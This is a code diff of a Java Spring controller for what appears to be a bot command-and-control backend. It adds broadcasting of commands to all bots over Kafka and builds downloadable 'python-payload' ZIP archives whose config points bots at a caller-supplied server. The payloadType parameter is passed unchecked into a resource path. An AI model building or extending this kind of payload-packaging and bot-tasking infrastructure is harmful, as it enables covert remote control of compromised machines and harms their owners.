@@ -2,22 +2,30 @@ package com.giacconidev.botcommander.backend.controller;
 
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
+import java.util.Objects;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 import org.springframework.context.annotation.Profile;
 import org.springframework.core.io.UrlResource;
+import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
 import org.springframework.http.ResponseEntity;
+import org.springframework.util.StreamUtils;
 import org.springframework.web.bind.annotation.*;
 
 import com.giacconidev.botcommander.backend.dto.ActionDto;
 import com.giacconidev.botcommander.backend.dto.BotDto;
 import com.giacconidev.botcommander.backend.dto.TaskDto;
+import com.giacconidev.botcommander.backend.model.Bot;
 import com.giacconidev.botcommander.backend.service.BotCommanderSocketHandler;
 import com.giacconidev.botcommander.backend.service.BotService;
 import com.giacconidev.botcommander.backend.service.KafkaProducer;
@@ -45,20 +53,34 @@ public class MainController {
     @PostMapping(value = "/process", produces = MediaType.APPLICATION_JSON_VALUE)
     public ResponseEntity<Map<String, String>> processInput(@RequestBody ActionDto action) {
         Map<String, String> response = new HashMap<>();
-        if (action.getActionType() == null || action.getActionType().isEmpty()){
+        if (action.getActionType() == null || action.getActionType().isEmpty()) {
             response.put("error", "Action type is required");
             return ResponseEntity.badRequest().body(response);
         }
-        // iterate over the selected bots and send the command to each bot
-        action.getSelectedBots().stream().forEach(botId -> {
-            TaskDto task = new TaskDto(action);
-            // Save the command to the db
-            BotDto result = botService.addNewTaskToBot(botId, task);
-            // Send the command to the bot
-            kafkaProducer.sendMessage(botId, task);
-            // update socker handler with the bot updated
-            botCommanderSocketHandler.broadcastUpdate(result);
-        });
+        TaskDto task = new TaskDto(action);
+        if (Objects.nonNull(action.getSelectedBots()) && action.getSelectedBots().isEmpty()) {
+            // send a broadcast message to all bots
+            List<BotDto> bots = botService.getAllBots().collectList().block();
+            if (bots == null || bots.isEmpty()) {
+                response.put("error", "No bots available to process the action");
+                return ResponseEntity.badRequest().body(response);
+            }
+            bots.stream().forEach(bot -> bot.getTasks().add(task));
+            botService.updateBots(bots.stream().map(Bot::new).toList());
+            // Send the command to frontend
+            botCommanderSocketHandler.broadcastUpdate(bots);
+            // Send the command to all bots
+            kafkaProducer.sendMessage("all", task);
+        } else
+            action.getSelectedBots().stream().forEach(botId -> {
+                // iterate over the selected bots and send the command to each bot
+                // Save the command to the db
+                BotDto result = botService.addNewTaskToBot(botId, task);
+                // Send the command to the bot
+                kafkaProducer.sendMessage(botId, task);
+                // update socker handler with the bot updated
+                botCommanderSocketHandler.broadcastUpdate(result);
+            });
         response.put("status", "OK");
         return ResponseEntity.ok(response);
     }
@@ -84,37 +106,28 @@ public class MainController {
         }
         // Download the payload
         try {
-            // Path to the Python project in resources
-            Path pythonProjectPath = Paths.get("src/main/resources/python-project");
 
-            // Modify the configuration file
-            Path configFilePath = pythonProjectPath.resolve("config.txt");
-            Files.write(configFilePath, ("bootstrap_servers=" + params.get("payloadUrl") + "\n").getBytes());
-            Files.write(configFilePath, ("topic=apps" + "\n").getBytes());
+            String configContent = "bootstrap_servers=" + params.get("payloadUrl") + "\n" +
+                    "topic=apps\n";
 
-            // Create a temporary ZIP file
+            // Create a ZIP file in the temporary directory
             Path zipFilePath = Files.createTempFile("python-payload", ".zip");
 
             // Zip the Python project
             try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFilePath.toFile()))) {
-                Files.walk(pythonProjectPath)
-                        .filter(path -> !Files.isDirectory(path))
-                        .forEach(path -> {
-                            ZipEntry zipEntry = new ZipEntry(pythonProjectPath.relativize(path).toString());
-                            try {
-                                zos.putNextEntry(zipEntry);
-                                Files.copy(path, zos);
-                                zos.closeEntry();
-                            } catch (IOException e) {
-                                throw new RuntimeException(e);
-                            }
-                        });
-            }
-            finally {
+                ArrayList<String> bannedFiles = new ArrayList<>(Arrays.asList("config.txt", "myenv", "__pycache__"));
+                // Copy the Python project files to the ZIP
+                copyFolderToZip(params.get("payloadType") + "-project", bannedFiles, zos);
+
+                // Add a file called config file to the ZIP
+                ZipEntry configEntry = new ZipEntry("config.txt");
+                // add configContent content to the config file
+                zos.putNextEntry(configEntry);
+                zos.write(configContent.getBytes());
+                zos.closeEntry();
+            } finally {
                 // Clean up the temporary file on exit
                 zipFilePath.toFile().deleteOnExit();
-                // delete the config file
-                //Files.deleteIfExists(configFilePath);
             }
 
             // Serve the ZIP file as a downloadable response
@@ -124,6 +137,34 @@ public class MainController {
                     .body(resource);
         } catch (Exception e) {
             throw new RuntimeException("Error: " + e.getMessage());
+        }
+    }
+
+    public void copyFolderToZip(String folderPath, ArrayList<String> bannedFiles, ZipOutputStream fos)
+            throws IOException {
+        // Create a resolver to find resources matching a pattern
+        PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver();
+
+        // Use the resolver to get resources from the specified folder
+        Resource[] resources = resolver.getResources("classpath:" + folderPath + "/*");
+
+        // Create a ZipOutputStream to write the ZIP file
+        for (Resource resource : resources) {
+            // Skip banned files
+            if (bannedFiles.contains(resource.getFilename())) {
+                continue;
+            }
+            // Create a new ZipEntry for each file
+            String fileName = resource.getFilename();
+            ZipEntry zipEntry = new ZipEntry(fileName);
+            fos.putNextEntry(zipEntry);
+
+            // Copy the content of the resource to the ZIP file
+            InputStream is = resource.getInputStream();
+            StreamUtils.copy(is, fos);
+            is.close();
+
+            fos.closeEntry();
         }
     }
 
